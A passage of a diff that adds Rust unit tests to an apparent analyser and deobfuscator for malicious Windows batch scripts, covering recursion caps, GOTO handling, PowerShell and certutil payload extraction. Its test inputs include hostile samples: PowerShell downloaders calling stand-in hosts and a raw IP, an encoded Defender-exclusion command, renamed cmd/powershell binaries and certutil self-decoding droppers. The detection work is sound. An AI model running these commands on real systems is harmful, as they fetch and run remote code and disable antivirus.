+        env.modified_filesystem.insert(
+            "b.bat".to_string(),
+            crate::env::FsEntry::Content {
+                content: child,
+                append: false,
+            },
+        );
+
+        super::analyze_extracted_payloads(&mut env, 1);
+
+        assert_eq!(
+            env.limits.child_scripts, 1,
+            "duplicate child content should only consume one child-script slot"
+        );
+    }
 
     #[test]
     fn child_script_cap_enforced() {
@@ -11912,6 +27814,88 @@ mod limits_tests {
         assert!(
             capped,
             "expected ChildScriptsCapped trait. traits: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn inline_call_recursion_uses_child_script_cap() {
+        let cfg = Config {
+            max_child_scripts: 1,
+            ..Config::default()
+        };
+        let report = analyze(b"call call echo hi\r\n", &cfg);
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ChildScriptsCapped)),
+            "expected ChildScriptsCapped for nested call recursion: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn inline_if_recursion_uses_child_script_cap() {
+        let cfg = Config {
+            max_child_scripts: 1,
+            ..Config::default()
+        };
+        let report = analyze(br#"if "a"=="a" if "b"=="b" echo hi"#, &cfg);
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ChildScriptsCapped)),
+            "expected ChildScriptsCapped for nested inline IF recursion: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn resolved_inline_if_goto_does_not_consume_child_script_budget() {
+        let cfg = Config {
+            max_child_scripts: 1,
+            ..Config::default()
+        };
+        let report = analyze(
+            b"if 1==1 goto :first\r\n\
+              :first\r\n\
+              if 1==1 goto :second\r\n\
+              :second\r\n\
+              if 1==1 goto :done\r\n\
+              :done\r\n\
+              echo reached\r\n",
+            &cfg,
+        );
+
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ChildScriptsCapped)),
+            "inline IF/GOTO branches should not consume child-script slots: {:?}",
+            report.traits
+        );
+        assert!(report.deobfuscated.contains("echo reached"));
+    }
+
+    #[test]
+    fn inline_start_recursion_uses_child_script_cap() {
+        let cfg = Config {
+            max_child_scripts: 1,
+            ..Config::default()
+        };
+        let report = analyze(b"start /min start /min echo hi\r\n", &cfg);
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ChildScriptsCapped)),
+            "expected ChildScriptsCapped for nested start recursion: {:?}",
             report.traits
         );
     }
@@ -12001,6 +27985,42 @@ mod goto_tests {
                 Trait::GotoUnresolved { to_label, .. } if to_label == "checkshit"
             )),
             "trailing-colon label should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn goto_resolves_backward_label_that_was_skipped_by_forward_jump() {
+        use crate::traits::Trait;
+
+        let script = b"goto start\r\n\
+                       :target\r\n\
+                       echo EXACT\r\n\
+                       goto done\r\n\
+                       :target0\r\n\
+                       echo WRONG\r\n\
+                       :start\r\n\
+                       goto target\r\n\
+                       :done\r\n\
+                       echo DONE\r\n";
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("echo EXACT"),
+            "backward jump to unvisited exact label was not followed:\n{}\ntraits: {:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report.deobfuscated.contains("echo WRONG"),
+            "goto target should not fall through to target0:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(
+                |t| matches!(t, Trait::GotoUnresolved { to_label, .. } if to_label == "target")
+            ),
+            "exact backward target was incorrectly unresolved: {:?}",
             report.traits
         );
     }
@@ -12946,6 +28966,39 @@ mod if_constant_fold_tests {
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn unresolved_parenthesized_if_block_does_not_execute_error_branch_goto() {
+        let script = br#"@echo off
+set SERVER_URL=https://if-block.example
+if errorlevel 1 (
+echo failed
+goto :end
+)
+echo success
+powershell -Command "Invoke-WebRequest '%SERVER_URL%/persist.bat' -OutFile 'persist.bat'"
+:end
+echo done
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                crate::traits::Trait::IfNotResolved { condition }
+                    if condition.starts_with("errorlevel 1")
+            )),
+            "dynamic errorlevel block should stay unresolved: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("echo success")
+                && report
+                    .deobfuscated
+                    .contains("https://if-block.example/persist.bat"),
+            "success path after unresolved if block was skipped:\n{}",
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
@@ -13381,6 +29434,67 @@ mod powershell_tests {
     }
 
     #[test]
+    fn marker_noise_powershell_launcher_preserves_flag_spacing() {
+        let marker = "〷 ꒤ ⪓ ⇉ ₳";
+        let script = format!(
+            "set \"ps=p{m}o{m}w{m}e{m}r{m}s{m}h{m}e{m}l{m}l {m}-ExecutionPolicy Bypass {m}-WindowStyle Hidden {m}-Command\"\r\n\
+             set \"ps=%ps:{m}=%\"\r\n\
+             %ps% \"Invoke-WebRequest https://marker-ps.example/p.ps1\"\r\n",
+            m = marker
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command"),
+            "marker-stripped PowerShell flags should remain space-separated:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("powershell-ExecutionPolicy")
+                && !report.deobfuscated.contains("Bypass-WindowStyle")
+                && !report.deobfuscated.contains("Hidden-Command"),
+            "marker stripping should not glue PowerShell flag boundaries:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn start_min_glued_powershell_launcher_spacing_is_repaired() {
+        let script = br#"@echo off
+setlocal enabledelayedexpansion
+set epUix=sTa
+set RvZzk=rT /m
+set fjkvB=in
+set JuQgM=POW
+set NHrCA=erSHE
+set jvgUf=lL
+set YckcS=-w h
+set BoUSX=-cOmMAn
+set nqUWR=D
+set dEjaHxwg=!epUix!!RvZzk!!fjkvB!!JuQgM!!NHrCA!!jvgUf!!YckcS!!BoUSX!!nqUWR!
+call !dEjaHxwg! "Write-Host ok"
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains(r#"call sTarT /min POWerSHElL -w h -cOmMAnD "Write-Host ok""#),
+            "glued start/min PowerShell launcher should be spaced:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("/minPOWerSHElL-w h-cOmMAnD"),
+            "glued start/min PowerShell launcher leaked:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn powershell_file_current_dir_tracks_script_content() {
         let mut env = Environment::new(&Config::default());
         let ps1 = b"Invoke-WebRequest https://ps-file-current-dir.example/payload.ps1".to_vec();
@@ -13485,6 +29599,36 @@ powershell -NoProfile -File "%TEMP%\copied.ps1""#,
                         && url == "https://ps-copy-provenance.example/stage.ps1"
             )),
             "PowerShell copied script execution did not resolve original download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_iwr_download_not_suppressed_by_later_file_url_argument() {
+        let report = analyze(
+            br#"powershell iwr -Uri "http://37.120.234.31/Update-KB5005101.ps1" -OutFile "%TEMP%\Update-KB5005101.ps1"
+powershell -ExecutionPolicy Bypass -File "%TEMP%\Update-KB5005101.ps1""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://37.120.234.31/Update-KB5005101.ps1"
+                        && dst.as_deref().is_some_and(|value| value.ends_with(r"Update-KB5005101.ps1"))
+            )),
+            "PowerShell iwr download was missing or lacked destination: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.contains("-File")
+                        && url == "http://37.120.234.31/Update-KB5005101.ps1"
+            )),
+            "later PowerShell -File should still resolve to downloaded URL: {:?}",
             report.traits
         );
     }
@@ -13789,6 +29933,38 @@ echo %PAYLOAD% | %RUN%"#,
     }
 
     #[test]
+    fn powershell_set_content_value_respects_output_cap() {
+        let mut env = Environment::new(&Config {
+            max_output_bytes: 8,
+            ..Config::default()
+        });
+
+        interpret_line(
+            &format!(
+                r#"powershell -Command "Set-Content -Path C:\Temp\stage.ps1 -Value '{}'" "#,
+                "A".repeat(100)
+            ),
+            &mut env,
+        );
+
+        assert!(
+            matches!(
+                env.modified_filesystem.get(r"c:\temp\stage.ps1"),
+                Some(FsEntry::Content { content, .. }) if content.len() == 8
+            ),
+            "PowerShell side-effect content was not capped: {:?}",
+            env.modified_filesystem.get(r"c:\temp\stage.ps1")
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::OutputCapped { .. })),
+            "expected OutputCapped trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn powershell_add_content_value_preserves_script_content() {
         let mut env = Environment::new(&Config::default());
         let ps1 = b"Invoke-WebRequest https://ps-add-content-value.example/stage.ps1".to_vec();
@@ -13908,6 +30084,26 @@ echo %PAYLOAD% | %RUN%"#,
     }
 
     #[test]
+    fn ascii_powershell_encoded_command_args_render_without_blob() {
+        let payload =
+            r#"-ExecutionPolicy Bypass -Command "& { Add-MpPreference -ExclusionPath 'C:\' }""#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!("powershell -EncodedCommand {b64}\r\n");
+        let r = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            r.deobfuscated.contains("Add-MpPreference -ExclusionPath"),
+            "ASCII encoded PowerShell args should be rendered:\n{}",
+            r.deobfuscated
+        );
+        assert!(
+            !r.deobfuscated.contains(&b64),
+            "ASCII encoded PowerShell blob should not remain in deob output:\n{}",
+            r.deobfuscated
+        );
+    }
+
+    #[test]
     fn copied_powershell_alias_encoded_command_extracts() {
         let payload = "iwr http://renamed-powershell.example/p.ps1";
         let utf16: Vec<u8> = payload
@@ -13928,6 +30124,17 @@ echo %PAYLOAD% | %RUN%"#,
             )),
             "renamed PowerShell encoded payload URL not extracted: {:?}\n{}",
             r.traits,
+            r.deobfuscated
+        );
+        assert!(
+            r.deobfuscated
+                .contains("iwr http://renamed-powershell.example/p.ps1"),
+            "renamed PowerShell encoded command should be rendered in deob output:\n{}",
+            r.deobfuscated
+        );
+        assert!(
+            !r.deobfuscated.contains(&b64),
+            "renamed PowerShell encoded blob should not remain in deob output:\n{}",
             r.deobfuscated
         );
     }
@@ -13953,6 +30160,24 @@ echo %PAYLOAD% | %RUN%"#,
                     if src == "https://xcopy-copied-ps.example/stage"
             )),
             "xcopy renamed PowerShell encoded payload URL not extracted: {:?}\n{}",
+            r.traits,
+            r.deobfuscated
+        );
+    }
+
+    #[test]
+    fn copied_cmd_alias_replays_copied_powershell_command_for_extraction() {
+        let script = br#"extrac32 /C /Y C:\\Windows\\System32\\cmd.exe C:\\Users\\Public\\alpha.pif
+extrac32 /C /Y C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Users\\Public\\aken.pif
+C:\\Users\\Public\\alpha.pif /c C:\\Users\\Public\\aken.pif -WindowStyle hidden -Command "Add-MpPreference -ExclusionPath 'C:\\'"
+"#;
+        let r = analyze(script, &Config::default());
+
+        assert!(
+            r.extracted_ps1_normalized
+                .iter()
+                .any(|ps| { ps.contains("Add-MpPreference") && ps.contains("ExclusionPath") }),
+            "copied PowerShell child command was not extracted: {:?}\n{}",
             r.traits,
             r.deobfuscated
         );
@@ -15453,6 +31678,31 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn mshta_inline_scripts_respect_child_script_cap() {
+        let mut env = Environment::new(&Config {
+            max_child_scripts: 1,
+            ..Config::default()
+        });
+
+        interpret_line(r#"mshta javascript:alert(1)"#, &mut env);
+        interpret_line(r#"mshta javascript:alert(2)"#, &mut env);
+
+        assert_eq!(
+            env.all_extracted_jscript.len(),
+            1,
+            "mshta should stop queueing inline scripts at the child-script cap: {:?}",
+            env.all_extracted_jscript
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::ChildScriptsCapped)),
+            "expected ChildScriptsCapped trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn mshta_javascript_location_url_emits_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -15591,6 +31841,36 @@ mod misc_handler_tests {
                 .windows("mshta-current-dir-content.example".len())
                 .any(|window| window == b"mshta-current-dir-content.example")),
             "current-dir mshta content did not queue script block: {:?}",
+            env.all_extracted_jscript
+        );
+    }
+
+    #[test]
+    fn mshta_language_less_vbscript_hta_content_queues_vbs_only() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "payload.hta".to_string(),
+            crate::env::FsEntry::Content {
+                content: br#"<html><script>private function CreateSession(wsman)
+dim shell
+set shell = CreateObject("WScript.Shell")
+end function</script></html>"#
+                    .to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line(r"mshta .\payload.hta", &mut env);
+
+        assert_eq!(
+            env.all_extracted_vbs.len(),
+            1,
+            "language-less VBScript HTA should queue as VBS: {:?}",
+            env.all_extracted_vbs
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty(),
+            "language-less VBScript HTA should not queue as JScript: {:?}",
             env.all_extracted_jscript
         );
     }
@@ -15814,6 +32094,12 @@ hh C:/Temp/payload.chm::/index.htm"#,
     }
 
     #[test]
+    fn browser_attached_url_flag_with_non_ascii_token_does_not_panic() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line("chrome --apé:http://example.com", &mut env);
+    }
+
+    #[test]
     fn explorer_local_target_resolves_prior_download_source_url() {
         let report = crate::analyze(
             br#"curl -o payload.hta https://explorer-local-source.example/payload.hta
@@ -15831,6 +32117,30 @@ explorer payload.hta"#,
             }),
             "Explorer local target did not resolve prior download source: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn explorer_large_filesystem_skips_basename_fallback_scan() {
+        let mut env = Environment::new(&Config::default());
+        for i in 0..5_000 {
+            env.modified_filesystem.insert(
+                format!(r"c:\temp\file{i}.hta"),
+                crate::env::FsEntry::Download {
+                    src: format!("https://large-fs.example/file{i}.hta"),
+                },
+            );
+        }
+
+        interpret_line("explorer file4999.hta", &mut env);
+
+        assert!(
+            !env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { url, .. } if url == "https://large-fs.example/file4999.hta"
+            )),
+            "large filesystem should not use basename fallback scan: {:?}",
+            env.traits
         );
     }
 
@@ -16774,6 +33084,7 @@ mod for_f_tests {
 mod synth_tests {
     use crate::env::{Config, Environment, FsEntry};
     use crate::synth::run_pipeline;
+    use crate::traits::Trait;
 
     #[test]
     fn synth_set_dumps_env_vars() {
@@ -17181,6 +33492,29 @@ echo %MARK%
         assert_eq!(
             lines,
             vec!["https://cmd-combined-switch.example/payload.exe".to_string()]
+        );
+    }
+
+    #[test]
+    fn synth_cmd_recursion_uses_child_script_cap() {
+        let mut env = Environment::new(&Config {
+            max_child_scripts: 1,
+            ..Config::default()
+        });
+
+        let lines = run_pipeline("cmd /c cmd /c echo ok", &mut env);
+
+        assert!(
+            lines.is_empty(),
+            "capped synthetic cmd recursion should not run nested child: {:?}",
+            lines
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::ChildScriptsCapped)),
+            "expected ChildScriptsCapped trait: {:?}",
+            env.traits
         );
     }
 
@@ -17690,6 +34024,29 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_decode_printable_js_is_published_as_extracted_payload() {
+        let mut env = Environment::new(&Config::default());
+        let payload = r#"var CP7V="sc"+"r";GetObject(CP7V+"ipt:https://evil.example/?1/");"#;
+        env.modified_filesystem.insert(
+            "src.b64".to_string(),
+            FsEntry::Content {
+                content: b64(payload).into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decode src.b64 stage.Js", &mut env);
+
+        assert!(
+            env.all_extracted_jscript
+                .iter()
+                .any(|body| body.as_slice() == payload.as_bytes()),
+            "decoded printable JS was not published as an extracted payload: {:?}",
+            env.all_extracted_jscript
+        );
+    }
+
+    #[test]
     fn certutil_decode_skips_optional_force_flag() {
         let mut env = Environment::new(&Config::default());
         let payload = "hello world";
@@ -18124,6 +34481,253 @@ mod certutil_tests {
                 .map(|(label, blob)| (label.as_str(), blob.len()))
                 .collect::<Vec<_>>()
         );
+    }
+
+    #[test]
+    fn large_self_certutil_certificate_payload_is_summarized_after_decode() {
+        use base64::Engine;
+
+        let decoded = format!(
+            "@echo off\r\necho decoded-cert\r\nrem {}\r\n",
+            "A".repeat(32_000)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let script = format!(
+            "@echo off\r\ncertutil -f -decode \"%~f0\" \"%TEMP%\\0.bat\" >nul 2>&1\r\ncall \"%TEMP%\\0.bat\"\r\nexit\r\n-----BEGIN CERTIFICATE----- {b64} -----END CERTIFICATE-----\r\n"
+        );
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "%~f0" && dst.to_ascii_lowercase().ends_with("\\0.bat") && *src_resolved
+            )),
+            "self certutil decode trait missing/resolution false: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted CERTIFICATE payload"),
+            "large certificate carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..1024]),
+            "raw certificate carrier leaked into deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn raw_new_certificate_request_hex_dump_pe_is_recovered_and_summarized() {
+        use base64::Engine;
+
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let mut hex_dump = String::new();
+        for (offset, chunk) in pe.chunks(16).enumerate() {
+            hex_dump.push_str(&format!("{:04x}\t", offset * 16));
+            for byte in chunk {
+                hex_dump.push_str(&format!("{byte:02x} "));
+            }
+            hex_dump.push_str("\r\n");
+        }
+        let b64 = base64::engine::general_purpose::STANDARD.encode(hex_dump.as_bytes());
+        let script = format!(
+            "@echo off\r\n-----BEGIN NEW CERTIFICATE REQUEST-----\r\n{b64}\r\n-----END NEW CERTIFICATE REQUEST-----\r\n"
+        );
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("new-certificate-request") && blob == &pe),
+            "raw NEW CERTIFICATE REQUEST PE was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted NEW CERTIFICATE REQUEST PE payload"),
+            "raw NEW CERTIFICATE REQUEST block was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "raw NEW CERTIFICATE REQUEST base64 remained in deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn raw_x509_crl_hex_dump_pe_is_recovered_and_summarized() {
+        use base64::Engine;
+        use std::fmt::Write as _;
+
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let mut hex = String::with_capacity(pe.len() * 2);
+        for byte in &pe {
+            write!(&mut hex, "{byte:02x}").unwrap();
+        }
+        let b64 = base64::engine::general_purpose::STANDARD.encode(hex.as_bytes());
+        let script =
+            format!("@echo off\r\n-----BEGIN X509 CRL-----\r\n{b64}\r\n-----END X509 CRL-----\r\n");
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("x509-crl") && blob == &pe),
+            "raw X509 CRL PE was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted X509 CRL PE payload"),
+            "raw X509 CRL block was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "raw X509 CRL base64 remained in deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn certificate_pem_pe_after_decoy_is_recovered_and_summarized() {
+        use base64::Engine;
+
+        let decoy = base64::engine::general_purpose::STANDARD.encode(b"not a pe");
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let noisy_b64 = b64
+            .as_bytes()
+            .chunks(64)
+            .map(|chunk| {
+                let mut line = std::str::from_utf8(chunk).unwrap().to_string();
+                line.push_str("{{");
+                line
+            })
+            .collect::<Vec<_>>()
+            .join("\r\n");
+        let script = format!(
+            "@echo off\r\n-----BEGIN CERTIFICATE-----\r\n{decoy}\r\n-----END CERTIFICATE-----\r\ncertutil -decode -f %0 out.exe\r\n-----BEGIN CERTIFICATE-----\r\n{noisy_b64}\r\n-----END CERTIFICATE-----\r\n"
+        );
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted CERTIFICATE PE payload"),
+            "PE CERTIFICATE block was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "raw PE CERTIFICATE base64 remained in deobfuscated output"
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("certificate-pe") && blob == &pe),
+            "PE CERTIFICATE block was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn certificate_pem_pe_is_summarized_when_other_raw_summary_wins() {
+        use base64::Engine;
+
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let alpha_noise = "abcdefghijklmnopqrstuvwxyz".repeat(4096);
+        let script = format!(
+            "@echo off\r\necho {alpha_noise}\r\ncertutil -decode -f %0 out.exe\r\n-----BEGIN CERTIFICATE-----\r\n{b64}\r\n-----END CERTIFICATE-----\r\n"
+        );
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted CERTIFICATE PE payload"),
+            "materialized CERTIFICATE block was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "materialized CERTIFICATE base64 remained in deobfuscated output"
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("certificate-pe") && blob == &pe),
+            "PE CERTIFICATE block was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn existing_pem_summary_replaces_large_remaining_pem_block() {
+        let b64 = "A".repeat(9000);
+        let text = format!(
+            "@echo off\r\n-----BEGIN CERTIFICATE-----\r\n{b64}\r\n-----END CERTIFICATE-----\r\nexit\r\nrem omitted CERTIFICATE PE payload (9000 base64 bytes, 128 bytes recovered)\r\n"
+        );
+
+        let cleaned = crate::replace_large_pem_blocks_with_existing_summary(&text)
+            .expect("large PEM block should be replaced");
+
+        assert!(
+            !cleaned.contains("-----BEGIN CERTIFICATE-----") && !cleaned.contains(&b64),
+            "large PEM block remained:\n{}",
+            cleaned
+        );
+        assert_eq!(
+            cleaned
+                .matches("rem omitted CERTIFICATE PE payload")
+                .count(),
+            1,
+            "summary should be emitted once:\n{}",
+            cleaned
+        );
+        assert!(cleaned.contains("exit"));
     }
 
     #[test]
@@ -20208,10 +36812,35 @@ call C:\Temp\renamed.js"#,
             .get(r"c:\temp\renamed.js")
             .expect("renamed.js missing");
         assert!(
-            matches!(entry, FsEntry::Content { content, .. }
-                if content.windows(b"esentutl-current-dir.example".len())
-                    .any(|window| window == b"esentutl-current-dir.example")),
-            "current-dir esentutl source did not preserve tracked content: {:?}",
+            matches!(entry, FsEntry::Copy { src } if src == "original.js"),
+            "current-dir esentutl source should preserve tracked content by reference: {:?}",
+            entry
+        );
+    }
+
+    #[test]
+    fn esentutl_generated_content_copy_uses_reference_not_clone() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "original.js".to_string(),
+            FsEntry::Content {
+                content: vec![b'A'; 4096],
+                append: false,
+            },
+        );
+
+        interpret_line(
+            r"esentutl /y original.js /d C:\Temp\renamed.js /o",
+            &mut env,
+        );
+
+        let entry = env
+            .modified_filesystem
+            .get(r"c:\temp\renamed.js")
+            .expect("renamed.js missing");
+        assert!(
+            matches!(entry, FsEntry::Copy { src } if src == "original.js"),
+            "esentutl should store a copy reference, not cloned content: {:?}",
             entry
         );
     }
@@ -20268,10 +36897,8 @@ call C:\Temp\renamed.js"#,
             .get(r"c:\temp\renamed.js")
             .expect("renamed.js missing");
         assert!(
-            matches!(entry, FsEntry::Content { content, .. }
-                if content.windows(b"esentutl-slash-source.example".len())
-                    .any(|window| window == b"esentutl-slash-source.example")),
-            "slash-equivalent esentutl source did not preserve tracked content: {:?}",
+            matches!(entry, FsEntry::Copy { src } if src == "c:/work/original.js"),
+            "slash-equivalent esentutl source should preserve tracked content by reference: {:?}",
             entry
         );
     }
@@ -20513,6 +37140,41 @@ mod exit_continue_tests {
     }
 
     #[test]
+    fn substitution_dictionary_and_post_exit_word_salad_are_not_rendered() {
+        let script = br#"goto helpful
+plain prose before label is skipped
+:helpful
+set coloredletter=c&&set roundedletter=o&&set loopingletter=l&&set rollingletter=r&&set startingletter=s&&set tappingletter=t&&set activeletter=a&&set exitingletter=e&&set xrayletter=x&&set innerletter=i&&set unusedletter=q
+set aa=c&&set bb=o&&set cc=l&&set dd=r&&set ee=f&&set ff=0&&set gg=s&&set hh=t
+%coloredletter%%roundedletter%%loopingletter%%roundedletter%%rollingletter% f0
+%startingletter%%tappingletter%%activeletter%%rollingletter%%tappingletter% wordpad
+%exitingletter%%xrayletter%%innerletter%%tappingletter%
+dinosaurs ray fair berry
+curl stem observe
+plain post exit junk
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("color f0")
+                && report.deobfuscated.contains("start wordpad")
+                && report.deobfuscated.contains("exit"),
+            "expanded commands were not rendered:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("set coloredletter=")
+                && !report.deobfuscated.contains("set aa=")
+                && !report.deobfuscated.contains("unusedletter")
+                && !report.deobfuscated.contains("dinosaurs ray fair berry")
+                && !report.deobfuscated.contains("curl stem observe")
+                && !report.deobfuscated.contains("plain post exit junk"),
+            "dictionary/prose noise should not be rendered:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn call_label_eof_still_returns_to_caller() {
         // Inside a call frame, eof should pop normally
         let script =
@@ -20599,8 +37261,5146 @@ mod quoted_semicolon_tests {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod trait_dedup_tests {
+    use crate::env::Environment;
     use crate::traits::Trait;
     use crate::{analyze, Config};
+
+    #[test]
+    fn equivalent_multistage_dropper_traits_keep_first_richer_record() {
+        let mut traits = vec![
+            Trait::MultiStageEncryptedDropper {
+                marker: "ps-self-marker-aes-cbc-gzip".to_string(),
+                b64_length: 0,
+                has_aes_cbc: true,
+                has_gzip_stage: true,
+                reads_self_lines: true,
+                aes_key_b64: Some("key".to_string()),
+                aes_iv_b64: Some("iv".to_string()),
+                assemblies_recovered: Some(4),
+                nested_aes: Vec::new(),
+            },
+            Trait::MultiStageEncryptedDropper {
+                marker: "ps-self-marker-aes-cbc-gzip".to_string(),
+                b64_length: 0,
+                has_aes_cbc: true,
+                has_gzip_stage: true,
+                reads_self_lines: true,
+                aes_key_b64: Some("key".to_string()),
+                aes_iv_b64: Some("iv".to_string()),
+                assemblies_recovered: Some(2),
+                nested_aes: Vec::new(),
+            },
+        ];
+
+        super::dedup_traits(&mut traits, 100);
+
+        let multistage: Vec<_> = traits
+            .iter()
+            .filter(|t| matches!(t, Trait::MultiStageEncryptedDropper { .. }))
+            .collect();
+        assert_eq!(multistage.len(), 1, "{traits:?}");
+        assert!(
+            matches!(
+                multistage[0],
+                Trait::MultiStageEncryptedDropper {
+                    assemblies_recovered: Some(4),
+                    ..
+                }
+            ),
+            "{traits:?}"
+        );
+    }
+
+    #[test]
+    fn repetitive_admin_cleanup_lines_are_summarized_before_timeout() {
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..2000 {
+            script.push_str(&format!(
+                "reg delete \"HKCU\\Software\\Spam\\{idx}\" /f\r\n"
+            ));
+        }
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 3,
+                ..Config::default()
+            },
+        );
+
+        assert!(
